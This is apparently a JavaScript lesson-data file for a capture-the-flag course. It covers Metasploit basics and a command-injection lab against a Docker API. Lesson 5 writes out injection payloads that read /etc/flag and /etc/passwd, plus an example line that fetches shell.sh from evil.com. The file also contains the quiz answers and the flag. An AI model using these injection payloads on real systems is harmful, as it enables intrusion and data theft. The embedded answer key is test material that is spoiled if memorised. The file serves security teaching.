/* ================================================
   CTF LABS — Metasploit Deep Dive Lab Data
   ================================================ */

const LESSONS = [
  //  LESSON 1: THE METASPLOIT DATABASE 
  {
    title: "The Metasploit Database (db_status)",
    points: 40,
    icon: "",
    practical: false,
    content: `WHAT IS METASPLOIT?
Imagine a master thief who has a massive belt full of every lockpick, crowbar, and secret key ever invented in the world. Whenever they find a locked door, they don't have to invent a new tool; they just reach into their belt, find the exact right key for that specific lock, and open the door in seconds! Metasploit is exactly like that magical toolbelt, but for hackers. It is a massive software program that contains thousands of pre-made "exploits" (keys) designed to break into different types of computers. Instead of writing complicated hacking code from scratch every time, a hacker just tells Metasploit which computer to attack, and Metasploit automatically uses the right tool to break in!

THE METASPLOIT DATABASE & WORKSPACES

 What is the Database? 
Imagine you are an explorer trying to map out a giant, confusing maze. If you don't write anything down, you will just walk in circles forever! Because the internet is like an incredibly giant maze, Metasploit uses a special database (called PostgreSQL) to act like a super-smart, perfectly organized notebook. Every time Metasploit finds a new computer, a new open door, or a secret password, it instantly writes it down in the notebook for you. This means you never have to remember anything yourself; you just look in the notebook!

 Why attack it? 
You aren't attacking the database itself; instead, you use it to stay organized during a complex attack. Imagine trying to rob a giant bank with hundreds of doors and guards. If you don't write down which doors are locked, which guards are asleep, and where the vaults are, you'll get confused and caught. The database does all that record-keeping for you automatically.

 How is it used? 
Instead of trying to remember complex information or writing it on sticky notes, you use simple commands inside Metasploit to manage your notebook:
   • db_status: This is like asking, "Is my notebook open and ready to write in?"
   • workspace: This creates separate chapters in your notebook. If you are testing the "Accounting" network and the "HR" network, you make a workspace for each so their notes don't mix.
   • db_nmap: This runs a scan (like sending out a drone to look around) and automatically writes everything it finds into your notebook.
   • hosts: This lists all the computers (targets) the drone found.
   • services: This lists all the open doors or programs running on those targets.`,
    questions: [
      { q: "What database management system does Metasploit integrate with? (one word)", a: "postgresql" },
      { q: "What command verifies the connection status of the Metasploit database?", a: "db_status" },
      { q: "What command creates a new workspace named 'internal'?", a: "workspace -a internal" },
      { q: "What command runs an Nmap version scan on 10.10.10.5 and saves it directly to the database?", a: "db_nmap -sV 10.10.10.5" },
      { q: "What command lists all discovered services across all hosts in the database?", a: "services" }
    ]
  },

  //  LESSON 2: METASPLOIT MODULE TYPES & PATHS 
  {
    title: "Module Types, Search Filters & Context",
    points: 50,
    icon: "",
    practical: false,
    content: `DEEP DIVE INTO MODULE PATHS & FILTERING

THE HACKER'S FILING CABINET
Imagine you go to a giant library that has millions of books. If all the books were just thrown in a giant pile on the floor, you would never be able to find the one you want! That is why libraries organize books onto very specific shelves: Fiction, then Mystery, then Authors starting with the letter A. Metasploit has thousands of different hacking tools (called "modules"), and it organizes them in the exact same way. It uses a directory structure that acts like a perfectly labeled filing cabinet. Once you understand how to read the labels on the drawers, you can instantly find the exact hacking tool you need in just a few seconds!

Module Directory Structure:

The standard Metasploit path looks like:
  <type>/<platform>/<service>/<name>

For example:
  exploit/linux/http/webmin_backdoor
    • type = exploit
    • platform = linux
    • service/protocol = http
    • name = webmin_backdoor

Advanced Search Filters:

When you run a standard 'search' command, Metasploit returns hundreds of results. You can narrow down your search using filters:

  • type:<type>      - Search by module type (exploit, auxiliary, post, payload, encoder, evasion, nop)
  • platform:<name>  - Search by target OS/platform (windows, linux, unix, android, osx)
  • port:<number>    - Search for modules targeting a specific port
  • cve:<year>       - Search by CVE year/number
  • rank:<rank>      - Search by reliability rank (excellent, great, good, normal, average, low, manual)

Examples:
  msf6 > search type:exploit platform:linux port:80
  msf6 > search cve:2021 name:log4j

The 'info' Command:

Before using any module, you should inspect its capabilities, author, CVE references, and default options.
  msf6 > info exploit/linux/http/webmin_backdoor`,
    questions: [
      { q: "What search filter restricts search results to 'exploit' modules only?", a: "type:exploit" },
      { q: "What search filter restricts results to the Windows platform?", a: "platform:windows" },
      { q: "What command displays detailed information (description, authors, targets) for a specific module?", a: "info" },
      { q: "What reliability rank is considered the highest/most reliable in Metasploit?", a: "excellent" }
    ]
  },

  //  LESSON 3: PAYLOADS DEEP DIVE (STAGED VS UNSTAGED) 
  {
    title: "Payloads: Staged vs Unstaged",
    points: 50,
    icon: "",
    practical: false,
    content: `STAGED VS UNSTAGED PAYLOADS

THE TINY NINJA AND THE BIG ARMY
When a hacker breaks a lock and gets the door open, they have to send something inside to actually take over the computer. This "something" is called a Payload. Think of a payload like a secret army that you want to sneak inside a castle. Sometimes, the hole in the wall is very big, so you can send your entire army in all at once! This is called an "Unstaged" payload. But what if the hole in the wall is only big enough for a mouse? Metasploit uses an amazing trick called a "Staged" payload. It sends a tiny, single ninja (the stager) through the tiny hole. Once the ninja is inside, they run to the main gate, unlock it from the inside, and let the rest of the giant army walk right in!

1. Staged Payloads:

Staged payloads are split into two parts:
  • Stage 0 (Stager): A tiny stub of code sent to the target. Its only job is to connect back to the attacker's machine, allocate memory, and download the larger, full payload.
  • Stage 1 (Stage): The actual full payload (like Meterpreter) sent over the network once the stager connects.

Pros: Very small footprint, fits into restricted buffer spaces in memory.
Cons: Requires a two-step network connection; more network noise.

How to identify in Metasploit: Staged payloads use a slash (/) to separate elements.
  Example: windows/meterpreter/reverse_tcp

2. Unstaged Payloads (Singles):

Unstaged payloads are completely self-contained. The entire payload code is sent at once in a single transmission.

Pros: More stable, works in environments where multiple network connections are blocked.
Cons: Much larger file size, may not fit in tight exploits.

How to identify in Metasploit: Unstaged payloads use an underscore (_) to join components.
  Example: windows/meterpreter_reverse_tcp

The Meterpreter Payload:

Meterpreter is an advanced, dynamically extensible payload that runs entirely in memory (via DLL injection) and does not write to disk, leaving a minimal footprint.`,
    questions: [
      { q: "What type of payload is split into a tiny stager and a larger stage? (one word)", a: "staged" },
      { q: "Does the payload path 'linux/x86/shell/reverse_tcp' represent a staged or unstaged payload?", a: "staged" },
      { q: "Does the payload path 'linux/x86/shell_reverse_tcp' represent a staged or unstaged payload?", a: "unstaged" },
      { q: "What is the name of Metasploit's advanced, in-memory payload that avoids writing to the target's disk?", a: "meterpreter" }
    ]
  },

  //  LESSON 4: EXPLOITING WEB APPLICATIONS 
  {
    title: "Exploiting Web Applications via Metasploit",
    points: 60,
    icon: "",
    practical: false,
    content: `EXPLOITING WEB APPLICATIONS

TARGETING THE FRONT DOOR
When most people think of Metasploit, they think of hackers attacking super-secret computer servers hidden deep in the basement of a company. But what about the company's actual website? A website is basically the giant, glowing front door of the company, sitting right on the internet for everyone to see. While Metasploit is famous for network service exploits, it also has a massive, powerful database built just for scanning and attacking these web applications. Because websites work a little differently than normal computer servers, hackers have to give Metasploit slightly different instructions to make the attack work properly.

Web Exploitation Concepts:

When targeting web apps, the RHOSTS parameter usually refers to the target domain or IP, but web apps often run on custom paths (like /blog or /app). Metasploit uses additional settings:

  • LHOST: Your local interface IP (attacker host). Necessary for reverse shells to know where to connect back.
  • LPORT: Your local listening port.
  • TARGETURI (or URI): The directory path of the vulnerable web application.
  • SSL: Boolean to enable or disable HTTPS transport.

Scanning Web Services:

Before launching an exploit, you should always scan and verify target vulnerability:
  • auxiliary/scanner/http/http_version: Detects web server banner.
  • auxiliary/scanner/http/dir_scanner: Locates web directories.

Exploit Verification:

Many exploit modules include a "check" feature that probes the target to see if the vulnerability exists WITHOUT actually running the exploit code.
  msf6 > check
  [*] 10.10.10.5:80 - The target is vulnerable.`,
    questions: [
      { q: "What option defines the local listening IP of the attacker for reverse connections?", a: "LHOST" },
      { q: "What option defines the path directory where the web application is hosted? (e.g. /wp-content)", a: "TARGETURI" },
      { q: "What command tests if a target is vulnerable without actually executing the exploit payload?", a: "check" },
      { q: "What option must be set to 'true' if the web server requires HTTPS? (three letters)", a: "SSL" }
    ]
  },

  //  LESSON 5: PRACTICAL CHALLENGE (DOCKER PANELS SHOWN HERE) 
  {
    title: "Practical — Exploit the Target API",
    points: 60,
    icon: "",
    practical: true,
    content: `PRACTICAL CHALLENGE — COMMAND INJECTION VIA CURL

In this practical lesson, you will exploit a vulnerable 
web API running on a Docker container.


    YOUR MISSION: Find and exploit a Command 
      Injection vulnerability to capture the flag.


WHAT IS COMMAND INJECTION?

The target is a web server called "SecureCorp API Portal".
It has an endpoint:  /api/diagnostics?cmd=<command>

The developers forgot to sanitise user input — the 'cmd' 
parameter is passed directly to the server's operating 
system! This is called OS Command Injection.


STEP-BY-STEP WALKTHROUGH:


STEP 1 — Launch Both Containers
  
    ① Click "Launch Target Server" above.        
    ② Click "Start Kali Container" above.        
    ③ Note the TARGET IP (e.g. 172.17.0.2)       
    ④ Note the Kali docker exec command shown.   
  

STEP 2 — Connect to Your Kali Container
  
    Open a terminal on your HOST machine and     
    paste the command shown in the Kali panel:   
                                                 
    $ docker exec -it <container-id> bash        
                                                 
    You are now inside Kali Linux!               
  

STEP 3 — Discover the Target
  
    Use curl to visit the target homepage:       
                                                 
    $ curl http://<TARGET_IP>/                   
                                                 
    You'll see the SecureCorp API Portal HTML.   
    Notice the hint on the page:                 
    "/api/diagnostics?cmd=ping"                  
  

STEP 4 — Test the Normal Endpoint
  
    Send a legitimate ping command:              
                                                 
    $ curl http://<TARGET_IP>/api/diagnostics?cmd=ping  
                                                 
    The server responds with ping output.        
    This proves the 'cmd' parameter controls     
    what the server executes!                    
  

STEP 5 — Exploit with Command Injection!
  
                                                 
     IMPORTANT: URL ENCODING                  
    Special characters must be URL-encoded       
    when sent in a URL:                          
      ;  →  %3B   (semicolon)                    
      |  →  %7C   (pipe)                         
      (space) → %20                              
                                                 
    The semicolon (;) tells the server to        
    finish the first command and start a new     
    one. We URL-encode it so curl sends it       
    correctly to the server.                     
                                                 
    Run this exact command (replace <TARGET_IP>  
    with the IP shown in the Target panel):      
                                                 
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"  
                                                 
      
    BREAKDOWN:                                   
    • ping        = the normal command           
    • %3B         = ; (start a 2nd command)      
    • cat%20      = cat (space = %20)            
    • /etc/flag   = the file we want to read     
      
                                                 
     The server returns the FLAG in JSON!      
  

ALTERNATIVE METHOD (pipe instead of semicolon):
  
    $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%7Ccat%20/etc/flag"  
                                                 
    %7C = pipe (|) character — also works!       
  


WHY THIS WORKS:

The server takes your 'cmd' parameter and passes it 
directly to the operating system. When it sees:
  ping ; cat /etc/flag
It runs TWO commands: first 'ping', then 'cat /etc/flag'.

In a real attack, this would allow an attacker to:
  • Read files:    cmd=ping%3Bcat%20/etc/passwd
  • Download malware:  cmd=ping%3Bwget%20http://evil.com/shell.sh
  • Create reverse shells back to the attacker

This is why INPUT VALIDATION is critical!`,
    questions: [
      { q: "What Linux command did you use to make HTTP requests from the Kali terminal? (one word)", a: "curl" },
      { q: "What is the URL-encoded representation of a semicolon? (e.g. %XX)", a: "%3B" },
      { q: "What is the vulnerable API endpoint path on the target server?", a: "/api/diagnostics" }
    ]
  },

  //  LESSON 6: FLAG SUBMISSION 
  {
    title: " Capture the Flag",
    points: 20,
    icon: "",
    practical: false,
    content: ` FLAG SUBMISSION


        SUBMIT YOUR CAPTURED FLAG BELOW


If you successfully ran the exploit command from 
the previous lesson, the server returned a JSON 
response containing the flag.

  You MUST run the actual exploit to get the flag!
    The flag is hidden inside the target container.
    There is no shortcut — execute the curl command
    from Lesson 5 to reveal it.

The response will look something like this:

  {                                              
    "status": "success",                         
    "output": "Simulated RCE Triggered:          
               FLAG{?????_????_????_??????}",     
    "debug_info": "Warning: Command              
     sanitization failed. Unauthorized           
     command context executed."                   
  }                                              


Copy the FLAG{...} value from YOUR terminal output 
and paste it into the answer box below.

HINT: If you forgot the exploit command, go back 
to Lesson 5, Step 5 and run:
  curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"


QUICK REFERENCE — Commands You Used:

  ① curl http://<IP>/
     → Discovered the API hint

  ② curl http://<IP>/api/diagnostics?cmd=ping
     → Tested the endpoint works

  ③ curl "http://<IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"
     → Exploited command injection → Got the flag!


WHAT YOU LEARNED IN THIS CHALLENGE:

   Metasploit Database — db_status, workspace, 
     db_nmap, hosts, services
   Module Paths — type/platform/service/name
   Search Filters — type:, platform:, cve:, rank:
   Staged vs Unstaged Payloads — slash vs underscore
   Web Exploitation Options — LHOST, TARGETURI, SSL
   URL Encoding for special characters
   Practical Command Injection via curl
   Why input sanitisation matters

CONGRATULATIONS ON COMPLETING THE METASPLOIT DEEP DIVE! `,
    questions: [
      { q: "Submit the flag you captured from the vulnerable target:", a: "FLAG{MSF_D33P_D1V3_M4ST3R}" }
    ]
  }
];
